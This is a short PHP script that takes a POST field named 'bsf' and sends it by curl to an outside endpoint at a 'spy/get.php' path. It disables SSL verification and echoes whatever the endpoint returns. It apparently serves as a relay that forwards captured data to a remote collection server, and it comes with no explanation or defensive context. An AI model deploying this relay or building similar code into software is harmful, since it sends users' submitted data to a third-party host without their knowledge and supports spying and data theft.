<?php
header("Content-type:text/html;charset=utf-8");
@$nr=@$_POST['bsf'];
$ch = curl_init();
$array = array('bsf' => $nr);
		    //参数设置
		    $res= curl_setopt ($ch, CURLOPT_URL,'http://prismx.cc/spy/get.php');
		    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
		    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
		    curl_setopt ($ch, CURLOPT_HEADER, 0);
		    curl_setopt($ch, CURLOPT_POST, 1);
		    curl_setopt($ch, CURLOPT_POSTFIELDS, $array);
		    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
		    $result = curl_exec ($ch);
		    curl_close($ch);
		    echo $result;
?>